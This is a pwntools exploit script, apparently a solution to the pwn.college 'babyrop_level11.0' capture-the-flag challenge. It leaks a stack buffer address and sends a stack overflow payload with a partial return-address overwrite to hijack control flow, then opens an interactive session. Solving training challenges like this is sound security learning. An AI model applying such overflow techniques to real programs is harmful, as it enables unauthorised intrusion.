from pwn import *
context.binary=e=ELF("./babyrop_level11.0")
libc=e.libc
gs="""
b *challenge+1767
"""
if args.DEBUG:
    context.log_level='debug'
if args.LOCAL:
    p=e.process()
    if args.GDB:
        gdb.attach(p,gdbscript=gs)
        pause()
elif args.SSH:
    s=ssh(host="dojo.pwn.college",user="hacker",keyfile="~/pwn_college/key",ignore_config=True)
    p=s.process("/challenge/babyrop_level11.0")
p.recvuntil(b"[LEAK] Your input buffer is located at: 0x")
buffer_locate=int(p.recv(12).decode(),16)
log.info(f"{hex(buffer_locate)}")
#p.recvuntil(b"The win function has just been dynamically constructed at 0x")
#win_func=int(p.recv(12).decode(),16)
#log.info(f"{hex(win_func)}")
p.send(b"A"*0x48+
           p64(buffer_locate-16)+b"\x8d")
p.interactive()